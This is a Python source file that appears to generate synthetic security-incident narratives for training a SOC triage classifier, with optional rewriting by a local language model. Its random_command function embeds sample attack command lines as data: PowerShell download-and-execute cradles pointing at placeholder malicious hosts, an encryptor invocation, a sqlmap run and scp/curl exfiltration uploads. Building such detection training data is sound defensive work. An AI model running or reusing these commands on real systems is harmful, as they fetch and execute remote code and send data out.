            "Could be false positive from recent security tool update",
        ],
        ("web_attack", "suspicious_network_activity"): [
            "Traffic patterns could also indicate automated testing or scanning",
            "Similar activity was observed during last penetration test",
            "May be misconfigured automation rather than malicious intent",
        ],
        ("insider_threat", "data_exfiltration"): [
            "Employee has legitimate access to these files for their role",
            "Transfer timing coincides with project deadline requiring work from home",
            "User explains they were archiving old project files per retention policy",
        ],
    }

    # 20% chance to add borderline characteristics
    if random.random() < 0.2 and len(confusable_classes) > 1:
        # Pick a confusable class
        other_class = random.choice([c for c in confusable_classes if c != event_type])

        # Look for matching borderline phrases
        for (class1, class2), phrases in borderline_phrases.items():
            if (event_type == class1 and other_class == class2) or (
                event_type == class2 and other_class == class1
            ):
                phrase = random.choice(phrases)
                # Append borderline context to main description
                desc_dict["description"] += f" {phrase}."
                break

    return desc_dict


# Sanitize LLM text output to clean up problematic characters and artifacts.
def sanitize_text(value: str) -> str:
    """
    Clean up problematic characters and artifacts from LLM output and templates.

    - Normalize en/em dashes to plain '-'
    - Remove specific odd sequences like ' ,Àì'
    - Strip non-ASCII bytes
    - Collapse repeated whitespace
    """
    if not isinstance(value, str):
        return value

    # Normalize common Unicode punctuation to ASCII equivalents
    cleaned = value.replace("–", "-").replace("—", "-")

    # Remove known-bad fragments
    cleaned = cleaned.replace(" ,Àì", ",").replace("Àì", "")

    # Strip any remaining non-ASCII characters
    cleaned = cleaned.encode("ascii", "ignore").decode("ascii")

    # Collapse excessive whitespace
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned


# Helper to sanitize every string element in a row
def sanitize_row(row):
    """
    Apply sanitize_text to all string elements in a CSV row.
    """
    return [sanitize_text(v) if isinstance(v, str) else v for v in row]


def initialize_llm_if_needed() -> bool:
    """Pre-initialize the LLM backend with progress indication.

    Returns True if LLM was initialized successfully, False otherwise.
    """
    global _GEN_LLM

    if not USE_LLM_FOR_GENERATOR:
        return False

    if _GEN_LLM is not None:
        return True  # Already initialized

    try:
        from llama_cpp import Llama  # type: ignore
    except Exception as e:
        print(f"Warning: llama_cpp not available, LLM features disabled: {e}")
        return False

    llm_backend = os.getenv("NLP_TRIAGE_LLM_BACKEND", "").strip()
    if not llm_backend:
        if LLM_GENERATOR_DEBUG:
            print(
                "No LLM backend specified (NLP_TRIAGE_LLM_BACKEND), skipping model initialization"
            )
        return False

    # Auto-enable GPU acceleration if not explicitly configured
    if "LLAMA_N_GPU_LAYERS" not in os.environ:
        os.environ["LLAMA_N_GPU_LAYERS"] = "999"
        if LLM_GENERATOR_DEBUG:
            print(
                "   🚀 Auto-enabled GPU acceleration (LLAMA_N_GPU_LAYERS=999)",
                file=sys.stderr,
            )

    if "LLAMA_METAL" not in os.environ:
        os.environ["LLAMA_METAL"] = "1"
        if LLM_GENERATOR_DEBUG:
            print(
                "   🚀 Auto-enabled Metal GPU backend (LLAMA_METAL=1)", file=sys.stderr
            )

    if "LLAMA_CUDA" not in os.environ:
        os.environ["LLAMA_CUDA"] = "1"
        if LLM_GENERATOR_DEBUG:
            print("   🚀 Auto-enabled CUDA GPU backend (LLAMA_CUDA=1)", file=sys.stderr)

    if "LLAMA_VULKAN" not in os.environ:
        os.environ["LLAMA_VULKAN"] = "1"
        if LLM_GENERATOR_DEBUG:
            print(
                "   🚀 Auto-enabled Vulkan GPU backend (LLAMA_VULKAN=1)",
                file=sys.stderr,
            )

    print(f"🤖 Initializing LLM backend: {llm_backend}")
    print("   This may take a few moments for Metal/GPU processing setup...")
    if LLM_GENERATOR_DEBUG:
        print(
            f"   GPU Config: LLAMA_N_GPU_LAYERS={os.environ.get('LLAMA_N_GPU_LAYERS', 'not set')}, "
            f"LLAMA_METAL={os.environ.get('LLAMA_METAL', 'not set')}",
            file=sys.stderr,
        )

    try:
        import io
        import contextlib
        import threading
        import time

        # Simple spinner during initialization
        spinning = True

        def spinner():
            chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
            i = 0
            while spinning:
                print(
                    f"\r   {chars[i % len(chars)]} Loading model...", end="", flush=True
                )
                time.sleep(0.1)
                i += 1

        spinner_thread = threading.Thread(target=spinner, daemon=True)
        spinner_thread.start()

        try:
            # Suppress noisy Metal init logs during initialization
            stderr_buffer = io.StringIO()
            with contextlib.redirect_stderr(stderr_buffer):
                _GEN_LLM = Llama(
                    model_path=llm_backend,
                    n_ctx=4096,
                    verbose=False,
                )
            # Success - stop spinner and show success message
            spinning = False
            print(f"\r   ✅ Model loaded successfully!{' ' * 20}")  # Clear spinner
            return True
        except Exception as e:
            spinning = False
            print(f"\r   ❌ Model loading failed!{' ' * 20}")  # Clear spinner
            if LLM_GENERATOR_DEBUG:
                captured = (
                    stderr_buffer.getvalue() if "stderr_buffer" in locals() else ""
                )
                if captured:
                    print(f"LLM initialization stderr: {captured}", file=sys.stderr)
            print(f"Failed to initialize LLM backend: {e}")
            print("   Generation will continue without LLM features")
            return False

    except ImportError as e:
        print(f"❌ Missing LLM dependencies: {e}")
        print("   Generation will continue without LLM features")
        return False


# Optionally ask an LLM to lightly rewrite/enrich synthetic narratives.
def llm_rewrite_descriptions(
    event_type: str,
    base_desc: dict,
    mitre: dict | None = None,
    event_id: int | None = None,
) -> dict:
    """Optionally ask an LLM to lightly rewrite/enrich synthetic narratives.

    Design goals:
    - Do not change the semantic label (event_type) of the incident.
    - Keep structure (main description, short summary, user report) intact.
    - Add variety in wording so the classifier learns robust patterns,
      not just exact template strings.

    This is intentionally safe to call even if no LLM backend is wired up.
    To enable it, set the env var NLP_TRIAGE_LLM_GENERATOR=1 and optionally
    NLP_TRIAGE_LLM_BACKEND to a local model path or endpoint.

    Example with the downloaded chat model:
        export NLP_TRIAGE_LLM_GENERATOR=1
        export NLP_TRIAGE_LLM_BACKEND=models/llama-2-7b-chat.Q5_K_S.gguf
    """
    # Debug: print LLM config if requested (only once)
    global GEN_LLM_DEBUG_CONFIG_PRINTED
    global GEN_LLM_REWRITE_ATTEMPTED, GEN_LLM_REWRITE_COUNT, _GEN_LLM, REWRITE_REPORT
    if LLM_GENERATOR_DEBUG and not GEN_LLM_DEBUG_CONFIG_PRINTED:
        _gen_llm_debug(
            f"[GEN-LLM] Debug mode active. USE_LLM_FOR_GENERATOR={USE_LLM_FOR_GENERATOR}, "
            f"backend='{os.getenv('NLP_TRIAGE_LLM_BACKEND', '').strip()}'"
        )
        GEN_LLM_DEBUG_CONFIG_PRINTED = True
    # If LLM rewriting is disabled, return the original text unchanged.
    if not USE_LLM_FOR_GENERATOR:
        return base_desc

    # Apply a rewrite sampling rate so we only send a subset of events to the LLM.
    # This keeps generation fast and cheaper while still adding diversity.
    # Default: rewrite roughly 20% of events (every 5th event_id if available).
    if LLM_GENERATOR_REWRITE_PROB <= 0.0:
        return base_desc

    # Prefer a deterministic sampling based on event_id when available,
    # so runs are reproducible given the same seed.
    if event_id is not None:
        interval = max(1, int(round(1.0 / LLM_GENERATOR_REWRITE_PROB)))
        if event_id % interval != 0:
            _gen_llm_debug(
                f"[GEN-LLM] Skipping LLM rewrite for event_id={event_id} based on rewrite probability"
            )
            return base_desc
    else:
        # Fall back to random sampling when event_id is not provided.
        if random.random() > LLM_GENERATOR_REWRITE_PROB:
            _gen_llm_debug("[GEN-LLM] Skipping LLM rewrite (random sampling)")
            return base_desc

    # Track that we are attempting an LLM rewrite for progress/debug purposes.
    global GEN_LLM_REWRITE_ATTEMPTED
    GEN_LLM_REWRITE_ATTEMPTED += 1
    # NOTE: Previously, we enforced a hard cap via LLM_GENERATOR_MAX_EVENTS.
    # That cap has been removed so that the number of rewrites is controlled
    # only by the rewrite probability and dataset size.

    # Check cache first to avoid redundant LLM calls for identical inputs.
    cache_key = (
        event_type,
        base_desc.get("description", ""),
        base_desc.get("description_short", ""),
        base_desc.get("description_user_report", ""),
        mitre.get("id") if isinstance(mitre, dict) else None,
    )
    cached = LLM_REWRITE_CACHE.get(cache_key)
    if cached is not None:
        if LLM_GENERATOR_DEBUG:
            print(
                f"[GEN-LLM] Cache hit for event_type='{event_type}' "
                f"(event_id={event_id if event_id is not None else 'n/a'})",
                flush=True,
            )
        # Overlay cached strings onto base_desc and return
        for k, v in cached.items():
            base_desc[k] = v
        return base_desc

    # Build prompt payload
    prompt_payload = {
        "incident_type": event_type,
        "mitre_id": mitre.get("id") if isinstance(mitre, dict) else None,
        "description": base_desc.get("description", ""),
        "description_short": base_desc.get("description_short", ""),
        "description_user_report": base_desc.get("description_user_report", ""),
    }

    # Strict system instruction for safe rewriting
    system_instruction = (
        "You are rewriting synthetic cybersecurity incident descriptions. "
        "DO NOT change the incident type (label). "
        "DO NOT imply a different type of attack. "
        "Only paraphrase, enrich wording, or clarify phrasing. "
        "IMPORTANT: Write complete sentences. DO NOT use ellipses (...) or truncate text. "
        "Return ONLY valid JSON with keys: "
        "description, description_short, description_user_report."
    )

    llm_backend = os.getenv("NLP_TRIAGE_LLM_BACKEND", "").strip()
    if not llm_backend:
        models_dir = Path("models")
        if models_dir.exists() and models_dir.is_dir():
            candidates = sorted(
                p
                for p in models_dir.iterdir()
                if p.is_file() and p.suffix.lower() in {".gguf", ".bin", ".pt", ".onnx"}
            )
            if candidates:
                llm_backend = str(candidates[0])
    _gen_llm_debug(
        f"[GEN-LLM] Resolved llm_backend='{llm_backend}' "
        "(after env + models/ discovery)"
    )
    if not llm_backend:
        return base_desc  # No backend defined

    # Use a local llama_cpp backend directly instead of relying on an external
    # Check if LLM backend is available (should be pre-initialized)
    global _GEN_LLM

    if _GEN_LLM is None:
        # LLM not initialized or failed to initialize
        return base_desc

    client = _GEN_LLM

    try:
        parsed = None
        last_error: Exception | None = None

        for attempt in range(1, LLM_GENERATOR_MAX_RETRIES + 1):
            _gen_llm_debug(
                f"[GEN-LLM] Rewriting event_type='{event_type}' "
                f"(event_id={event_id if event_id is not None else 'n/a'}) "
                f"attempt {attempt}/{LLM_GENERATOR_MAX_RETRIES}"
            )

            # Progressively increase temperature per attempt
            temp_for_attempt = min(LLM_GENERATOR_TEMPERATURE + 0.1 * (attempt - 1), 0.9)

            # Build a compact, Llama-2-instruct friendly prompt that *strongly*
            # encourages valid JSON. We include a single concrete example so the
            # model sees the exact shape and keys we expect.
            example_input = {
                "incident_type": "phishing",
                "mitre_id": "T1566.002",
                "description": "Initial triage shows user alice.w reported a suspicious email with a fake login link attempting to steal credentials",
                "description_short": "Suspicious email with fake login link.",
                "description_user_report": "User reported an email asking them to verify their account.",
            }
            example_output = {
                "description": "Triage indicates a likely phishing email targeting alice.w with malicious credentials harvesting intent through a fraudulent login portal",
                "description_short": "Credential phishing email targeting alice.w.",
                "description_user_report": "I received an email asking me to verify my account, and the link looked suspicious.",
            }

            prompt_text = (
                "[INST]\n"
                f"{system_instruction}\n\n"
                "Here is one example of the input and the required JSON output.\n\n"
                "Example input:\n"
                f"{json.dumps(example_input, indent=2)}\n\n"
                "Example output (JSON only):\n"
                f"{json.dumps(example_output, indent=2)}\n\n"
                "Now rewrite the following incident.\n\n"
                "Incident input:\n"
                f"{json.dumps(prompt_payload, indent=2)}\n\n"
                "Respond ONLY with a JSON object of the form:\n"
                '{"description": "...", "description_short": "...", "description_user_report": "..."}'
                "\n[/INST]\n"
            )

            try:
                completion = client(
                    prompt_text,
                    max_tokens=512,
                    temperature=temp_for_attempt,
                    stop=["\n\n###", "```"],
                )
                raw = (
                    completion["choices"][0]["text"]
                    if completion.get("choices")
                    else ""
                )
            except Exception as e:
                last_error = e
                _gen_llm_debug(
                    f"[GEN-LLM] Error calling llama_cpp backend on attempt {attempt}: {e}"
                )
                continue

            # First, try direct JSON parse.
            if isinstance(raw, str):
                try:
                    parsed = json.loads(raw)
                    break
                except Exception as e:
                    last_error = e
                    # Try regex-based extraction of the first JSON object.
                    m = re.search(r"\{.*\}", raw, re.DOTALL)
                    if m:
                        try:
                            parsed = json.loads(m.group(0))
                            break
                        except Exception as e2:
                            last_error = e2
            else:
                last_error = TypeError(
                    f"Unexpected LLM return type from llama_cpp: {type(raw)!r}"
                )

        if parsed is None:
            _gen_llm_debug(
                f"[GEN-LLM] LLM rewrite failed for event_type='{event_type}' "
                f"(event_id={event_id if event_id is not None else 'n/a'}): "
                f"{last_error}"
            )
            return base_desc

        # Validate and clean the three narrative fields. If the LLM output is
        # unusable (empty, ellipsis-only, wrong type), fall back to the
        # deterministic base descriptions.
        cleaned = base_desc.copy()

        def validate_field(key: str) -> str:
            value = parsed.get(key)
            if not isinstance(value, str):
                return base_desc.get(key, "")
            stripped = value.strip()
            # Reject empty or ellipsis-only fields
            if stripped in {"", "...", "…"}:
                return base_desc.get(key, "")
            # Sanitize weird characters / artifacts
            return sanitize_text(stripped)

        try:
            for key in ("description", "description_short", "description_user_report"):
                cleaned[key] = validate_field(key)

            # If all three fields ended up identical to base_desc, there's no
            # effective rewrite; skip caching to avoid noise.
            if (
                cleaned["description"] == base_desc.get("description")
                and cleaned["description_short"] == base_desc.get("description_short")
                and cleaned["description_user_report"]
                == base_desc.get("description_user_report")
            ):
                return base_desc

            # Store in cache for future identical prompts.
            LLM_REWRITE_CACHE[cache_key] = {
                "description": cleaned["description"],
                "description_short": cleaned["description_short"],
                "description_user_report": cleaned["description_user_report"],
            }

            # Track successful rewrites and emit a lightweight progress indicator when debugging.
            global GEN_LLM_REWRITE_COUNT
            GEN_LLM_REWRITE_COUNT += 1
            if (
                LLM_GENERATOR_DEBUG
                and event_id is not None
                and GEN_LLM_REWRITE_COUNT % 50 == 0
            ):
                _gen_llm_debug(
                    f"[GEN-LLM] Rewrites completed: {GEN_LLM_REWRITE_COUNT} "
                    f"(last event_id={event_id}, attempted={GEN_LLM_REWRITE_ATTEMPTED})"
                )

            # Debug: print which fields changed for this event_id
            if LLM_GENERATOR_DEBUG and event_id is not None:
                _gen_llm_debug(
                    f"[GEN-LLM] Rewrite applied for event_id={event_id}: "
                    f"description_changed={cleaned['description'] != base_desc.get('description')} "
                    f"short_changed={cleaned['description_short'] != base_desc.get('description_short')} "
                    f"user_changed={cleaned['description_user_report'] != base_desc.get('description_user_report')}"
                )

            # If rewrite reporting is enabled, capture before/after details
            if REWRITE_REPORT_ENABLED and event_id is not None:
                REWRITE_REPORT.append(
                    {
                        "event_id": event_id,
                        "event_type": event_type,
                        "description_before": base_desc.get("description", ""),
                        "description_after": cleaned.get("description", ""),
                        "description_short_before": base_desc.get(
                            "description_short", ""
                        ),
                        "description_short_after": cleaned.get("description_short", ""),
                        "description_user_report_before": base_desc.get(
                            "description_user_report", ""
                        ),
                        "description_user_report_after": cleaned.get(
                            "description_user_report", ""
                        ),
                    }
                )

            return cleaned
        except Exception:
            # If anything feels off, keep deterministic text
            return base_desc

    except Exception as e:
        _gen_llm_debug(
            f"[GEN-LLM] Exception during LLM rewrite for event_type='{event_type}' "
            f"(event_id={event_id if event_id is not None else 'n/a'}): {e}"
        )
        return base_desc

    return base_desc


def random_file_path(event_type: str, subtype: str | None = None) -> str:
    if event_type in {"malware", "policy_violation"}:
        if subtype == "ransomware":
            return random.choice(
                [
                    r"C:\Users\Public\Documents\invoice_data.xlsx",
                    r"C:\Users\alice\Documents\q4_financials.docx",
                    r"C:\Shared\Projects\client_data\export.csv",
                ]
            )
        return random.choice(
            [
                r"C:\Users\alice\Downloads\installer.exe",
                r"C:\Users\Public\setup.tmp",
                r"C:\Windows\Temp\update.ps1",
            ]
        )
    if event_type in {"web_attack", "data_exfiltration"}:
        return random.choice(
            [
                "/var/www/html/index.php",
                "/var/www/app/login.jsp",
                "/opt/web/api/export.csv",
            ]
        )
    return random.choice(
        [
            r"C:\Users\alice\Documents\notes.txt",
            "/home/user/readme.txt",
        ]
    )


def random_command(event_type: str, subtype: str | None = None) -> str:
    if event_type == "malware" and subtype == "ransomware":
        return random.choice(
            [
                r'"C:\Users\Public\encryptor.exe" --path C:\Users\ --recursive',
                'powershell -nop -w hidden -c "Invoke-WebRequest http://mal.example.com/rn.ps1 | iex"',
            ]
        )
    if event_type == "malware":
        return random.choice(
            [
                "powershell -enc SQBtAG8AcgBlACAAYwBhAGwAbABlAGQALgAuLg==",
                "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/a.ps1')\"",
            ]
        )
    if event_type == "web_attack" and subtype == "sqli":
        return random.choice(
            [
                "sqlmap -u 'http://target.example.com/item?id=10' --batch",
                "curl 'http://target.example.com/login.php?user=admin' OR 1=1 --data pass=test'",
            ]
        )
    if event_type == "data_exfiltration":
        return random.choice(
            [
                "scp data.tar.gz user@198.51.100.10:/tmp/",
                "curl -T export.zip https://fileshare.example.net/upload",
            ]
        )
    return ""


def random_malicious_url():
    domain = random.choice(MALICIOUS_DOMAINS)
    path = random_url_path()
    return f"http://{domain}{path}"


def choose_phishing_subtype():
    # Credential harvest most common, followed by malware delivery
    return random.choices(PHISHING_SUBTYPES, weights=[4, 3, 2, 2])[0]


def choose_malware_subtype():
    # More variety: generic, ransomware, trojan, loader
    return random.choices(MALWARE_SUBTYPES, weights=[3, 2, 2, 1])[0]


def choose_access_abuse_subtype():
    # Impossible travel and brute force most common
    return random.choices(ACCESS_ABUSE_SUBTYPES, weights=[3, 3, 2])[0]


def choose_data_exfil_subtype():
    # Cloud upload most common in modern environments
    return random.choices(DATA_EXFILTRATION_SUBTYPES, weights=[4, 3, 2, 1])[0]


def choose_policy_violation_subtype():
    # Shadow IT and data handling violations are most frequent
    return random.choices(POLICY_VIOLATION_SUBTYPES, weights=[3, 4, 2])[0]


def choose_web_subtype():
    # Mix of injection, XSS, brute-force, and availability
    return random.choices(WEB_ATTACK_SUBTYPES, weights=[3, 3, 2, 2])[0]


def choose_benign_subtype():
    # Maintenance and noise most common
    return random.choices(BENIGN_SUBTYPES, weights=[3, 2, 3, 1])[0]


def choose_insider_subtype():
    # Weighted towards data hoarding and resignation scenarios
    return random.choices(INSIDER_THREAT_SUBTYPES, weights=[2, 3, 2, 3])[0]


def choose_credential_compromise_subtype():
    # MFA fatigue and session hijack are most common
    return random.choices(CREDENTIAL_COMPROMISE_SUBTYPES, weights=[3, 3, 2, 2])[0]


def choose_suspicious_network_subtype():
    # Port scanning is most common, followed by beaconing
    return random.choices(SUSPICIOUS_NETWORK_SUBTYPES, weights=[4, 3, 2, 2])[0]


# -----------------------------------------------------
# Helper functions for original 7 classes
# -----------------------------------------------------


def random_phishing_lure():
    """Return a random phishing lure message."""
    return random.choice(PHISHING_LURES)


def random_phishing_spoof():
    """Return a random sender spoofing technique."""
    return random.choice(PHISHING_SENDER_SPOOFS)


def random_phishing_artifact():
    """Return a random phishing artifact."""
    return random.choice(PHISHING_ARTIFACTS)


def random_malware_delivery():
    """Return a random malware delivery method."""
    return random.choice(MALWARE_DELIVERY_METHODS)


def random_malware_behavior():
    """Return a random malware behavior."""
    return random.choice(MALWARE_BEHAVIORS)


def random_ransomware_indicator():
    """Return a random ransomware indicator."""
    return random.choice(RANSOMWARE_INDICATORS)


def random_impossible_travel():
    """Return a random impossible travel pattern."""
    return random.choice(IMPOSSIBLE_TRAVEL_PATTERNS)


def random_brute_force_indicator():
    """Return a random brute force indicator."""
    return random.choice(BRUTE_FORCE_INDICATORS)


def random_compromised_behavior():
    """Return a random compromised account behavior."""
    return random.choice(COMPROMISED_ACCOUNT_BEHAVIORS)


def random_exfil_staging():
    """Return a random data exfiltration staging method."""
    return random.choice(EXFIL_STAGING_METHODS)


def random_exfil_destination():
    """Return a random exfiltration destination."""
    return random.choice(EXFIL_DESTINATIONS)


def random_exfil_timing():
    """Return a random exfiltration timing anomaly."""
    return random.choice(EXFIL_TIMING_ANOMALIES)


def random_shadow_it():
    """Return a random shadow IT behavior."""
    return random.choice(SHADOW_IT_BEHAVIORS)


def random_data_handling_violation():
    """Return a random data handling violation."""
    return random.choice(DATA_HANDLING_VIOLATIONS)


def random_config_risk():
    """Return a random configuration risk."""
    return random.choice(CONFIGURATION_RISKS)


def random_sqli_pattern():
    """Return a random SQL injection pattern."""
    return random.choice(SQL_INJECTION_PATTERNS)


def random_xss_pattern():
    """Return a random XSS attack pattern."""
    return random.choice(XSS_ATTACK_PATTERNS)


def random_web_bruteforce():
    """Return a random web brute force characteristic."""
    return random.choice(WEB_BRUTEFORCE_CHARACTERISTICS)


def random_maintenance_activity():
    """Return a random maintenance activity."""
    return random.choice(MAINTENANCE_ACTIVITIES)


def random_monitoring_noise():
    """Return a random monitoring noise source."""
    return random.choice(MONITORING_NOISE)


def random_productivity_tool():
    """Return a random user productivity tool."""
    return random.choice(USER_PRODUCTIVITY_TOOLS)


# -----------------------------------------------------
# Helper functions for new 3 classes
# -----------------------------------------------------


def random_hr_context():
    """Return a random HR-related context for insider threats."""
    return random.choice(HR_CONTEXTS)


def random_hr_timing():
    """Return a random HR timing phrase for insider threats."""
    return random.choice(HR_TIMING_PHRASES)


def random_insider_behavior():
    """Return a random insider behavioral cue."""
    return random.choice(INSIDER_BEHAVIORAL_CUES)


def random_mfa_anomaly():
    """Return a random MFA anomaly for credential compromise."""
    return random.choice(MFA_ANOMALIES)


def random_user_denial():
    """Return a random user denial phrase."""
    return random.choice(USER_DENIAL_PHRASES)


def random_device_fingerprint():
    """Return a random device fingerprint cue."""
    return random.choice(DEVICE_FINGERPRINT_CUES)


def random_scanning_pattern():
    """Return a random network scanning pattern."""
    return random.choice(SCANNING_PATTERNS)


def random_beaconing_pattern():
    """Return a random beaconing pattern."""
    return random.choice(BEACONING_PATTERNS)


def random_lateral_movement():
    """Return a random lateral movement cue."""
    return random.choice(LATERAL_MOVEMENT_CUES)


# ------------------------
# 3. Description templates
# ------------------------


def build_descriptions(
    event_type,
    user,
    device,
    src_ip,
    dest_ip,
    src_country,
    dest_country,
    dest_port,
    detection_rule,
    mitre=None,
    subtype=None,
) -> dict:
    """
    Return a dict with multiple narrative variants:
    - description (main / detailed)
    - description_short
    - description_user_report

    The intent is to reflect realistic SOC narratives per event_type while
    keeping some ambiguity and overlap so the model does not learn trivial rules.
    """
    mitre_id = mitre["id"] if isinstance(mitre, dict) else None
    mitre_name = mitre["name"] if isinstance(mitre, dict) else None
    mitre_short = mitre["short"] if isinstance(mitre, dict) else None
    verb_detect = random.choice(DETECT_VERBS)
    verb_report = random.choice(REPORT_VERBS)
    triage_phrase = random.choice(TRIAGE_PHRASES)

    file_path = random_file_path(event_type)
    cmd = random_command(event_type)
    url = random_malicious_url() if event_type == "phishing" else ""
    url_path = random_url_path()
    domain = random.choice(DOMAINS)

    # Small helper pools for richer variation
    cloud_providers = ["Google Drive", "Dropbox", "Box", "OneDrive"]
    usb_phrases = [
        "unencrypted USB drive",
        "personal flash drive",
        "removable media that is not approved",
    ]
    ransomware_phrases = [
        "files are encrypted and a ransom note was displayed",
        "systems began encrypting user documents and demanding payment",
        "critical backup files became unreadable and the host showed a ransom message",
    ]
    outage_phrases = [
        "customers cannot load pages and are timing out at login",
        "the main site is intermittently unavailable for external users",
        "users report slow page loads and intermittent 503 errors from the site",
    ]

    # -----------------------
    # PHISHING
    # -----------------------
    if event_type == "phishing":

        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This behavior aligns with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        main = (
            f"{triage_phrase} that user {user} {verb_report} a suspicious email. "
            f"The message claimed to be from IT and directed the user to "
            f"a login page at {url or (domain + url_path)}. "
            f"Headers and sender IP {src_ip} in {src_country} are inconsistent with "
            f"legitimate corporate mail infrastructure. "
            f"The email gateway {verb_detect} indicators consistent with a credential "
            f"harvesting campaign and triggered rule '{detection_rule}'."
        )
        if mitre_clause:
            main += mitre_clause

        short = (
            f"Suspicious email to {user} with fake login link from {src_ip} "
            f"({src_country}); gateway {verb_detect} likely credential phishing."
        )
        user_view = (
            f"{user} {verb_report} receiving an email about account verification "
            f"that linked to a non-corporate login page and looked 'off'."
        )

    # -----------------------
    # MALWARE (incl. ransomware subtype)
    # -----------------------
    elif event_type == "malware":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This activity is consistent with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        # Decide if this looks like ransomware or generic malware
        is_ransom = (subtype == "ransomware_malware") or (random.random() < 0.35)

        if is_ransom:
            # Sometimes emphasize backup hosts and recovery keys without explicitly
            # spelling out "ransom" in the user report, to create realistic ambiguity.
            if random.random() < 0.4:
                main = (
                    f"{triage_phrase} that critical files on backup host {device} became "
                    f"encrypted and users are requesting a recovery key. EDR on {device} "
                    f"{verb_detect} mass encryption activity and deletion of shadow copies, "
                    f"with connections to {dest_ip}:{dest_port} in {dest_country}. "
                    f"Rule '{detection_rule}' fired on ransomware-like behavior."
                )
                if mitre_clause:
                    main += mitre_clause

                short = (
                    f"Likely ransomware on backup host {device}: encrypted files and "
                    f"recovery key requested."
                )
                user_view = (
                    f"{user} {verb_report} that files on {device} are encrypted and they "
                    f"need a recovery key to restore access."
                )
            else:
                ransom_detail = random.choice(ransomware_phrases)
                main = (
                    f"{triage_phrase} that EDR on {device} {verb_detect} behavior consistent "
                    f"with ransomware. Shortly before the alert, {ransom_detail}. "
                    f"The host communicated with {dest_ip}:{dest_port} in {dest_country} "
                    f"and accessed {file_path}. Rule '{detection_rule}' fired on "
                    f"encryption patterns and file modification spikes."
                )
                if mitre_clause:
                    main += mitre_clause

                short = (
                    f"Ransomware-like activity on {device}: encryption behavior and "
                    f"communication with {dest_ip}:{dest_port}."
                )
                user_view = (
                    f"{user} {verb_report} that files on {device} suddenly became encrypted "
                    f"and a message appeared demanding payment for a recovery key."
                )
        else:
            # Generic malware with stronger threat indicators
            malware_behavior = random.choice(
                [
                    "attempting to disable security software and establish persistence",
                    "executing obfuscated code and downloading additional payloads",
                    "performing reconnaissance and credential harvesting",
                    "communicating with known command-and-control infrastructure",
                    "attempting registry modifications and privilege escalation",
                    "injecting malicious code into legitimate processes",
                    "creating scheduled tasks for persistence and lateral movement",
                ]
            )

            main = (
                f"{triage_phrase} that EDR on {device} {verb_detect} malicious process "
                f"activity indicating malware infection. The compromised host is "
                f"{malware_behavior} while communicating with suspicious IP {dest_ip}:{dest_port} "
                f"in {dest_country}. File system analysis reveals malicious artifacts at {file_path}. "
            )
            if cmd:
                main += f"Command line analysis shows suspicious execution: {cmd} "
            main += (
                f"Behavioral analysis matches known malware families and attack tooling. "
                f"Rule '{detection_rule}' triggered on multiple malware indicators."
            )
            if mitre_clause:
                main += mitre_clause

            short = (
                f"Malware detected on {device}: {malware_behavior} and C2 communication "
                f"with {dest_ip}:{dest_port}."
            )
            user_view = (
                f"{user} {verb_report} that {device} was behaving abnormally after opening "
                f"an email attachment; EDR {verb_detect} active malware infection requiring "
                f"immediate isolation and remediation."
            )
    # -----------------------
    # ACCESS ABUSE
    # -----------------------
    elif event_type == "access_abuse":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This pattern aligns with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        pattern = random.choice(["impossible_travel", "bruteforce", "lockout"])
        if pattern == "impossible_travel":
            main = (
                f"{triage_phrase} multiple logins for {user} from geographically "
                f"distant locations within a short time window. Attempts originated "
                f"from {src_ip} ({src_country}) followed by a successful login from "
                f"{dest_ip} ({dest_country}). This pattern is inconsistent with known "
                f"user behavior and triggered rule '{detection_rule}'."
            )
            user_view = (
                f"{user} {verb_report} receiving alerts about sign-ins from another "
                f"city they were not traveling to."
            )
        elif pattern == "bruteforce":
            main = (
                f"{triage_phrase} repeated failed login attempts for {user} from "
                f"{src_ip} ({src_country}), followed by a successful login outside "
                f"normal working hours. The system locked the account briefly and "
                f"then allowed access, which is consistent with password guessing."
            )
            user_view = (
                f"{user} {verb_report} being locked out repeatedly and then seeing a "
                f"successful login notification they do not recognize."
            )
        else:  # lockout-style narrative
            main = (
                f"{triage_phrase} repeated account lockouts for {user} associated "
                f"with sign-in attempts from unrecognized locations. "
                f"Authentication telemetry shows unusual IPs including {src_ip} and "
                f"{dest_ip}, which do not match historical baselines."
            )
            user_view = (
                f"{user} {verb_report} that their account was locked out several times "
                f"and they received alerts about sign-ins from another city."
            )

        if mitre_clause:
            main += mitre_clause

        short = (
            f"Unusual authentication pattern for {user} involving failed logins, "
            f"lockouts, or impossible travel from {src_ip}/{dest_ip}."
        )

    # -----------------------
    # DATA EXFILTRATION
    # -----------------------
    elif event_type == "data_exfiltration":

        cloud = random.choice(cloud_providers)

        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This behavior matches MITRE technique {mitre_id} ({mitre_name})."
            )

        main = (
            f"{triage_phrase} large outbound transfers from {device} ({src_ip}) to "
            f"{cloud} infrastructure at {dest_ip}:{dest_port} in {dest_country}. "
            f"The volume and timing deviate from historical baselines for this host. "
            f"File access logs suggest bulk reads under {file_path}. "
            f"Telemetry from DLP and proxy combined to trigger rule '{detection_rule}'."
            f"{mitre_clause}"
        )

        short = (
            f"Possible exfiltration: multi-GB transfers from {src_ip} to {cloud} "
            f"({dest_ip}:{dest_port}) after hours."
        )
        user_view = (
            f"{user} {verb_report} that a bulk export or sync job appeared to run "
            f"unexpectedly on {device}, moving many files to a cloud storage location."
        )
        # New behavioral modes
        dark_web_mode = (
            random.random() < 0.20
        )  # 20% of exfil events use dark web infrastructure
        combo_usb_cloud = (
            random.random() < 0.30 and not dark_web_mode
        )  # 30% use USB staging, unless dark_web_mode triggered

        # --- Dark Web Exfiltration -------------------------------------
        if dark_web_mode:
            main = (
                f"{triage_phrase} outbound transfers from server {device} ({src_ip}) "
                f"to an anonymized hosting service associated with dark web marketplaces. "
                f"Telemetry shows data pulled from directories under {file_path} and "
                f"transferred to {dest_ip}:{dest_port} in {dest_country}. "
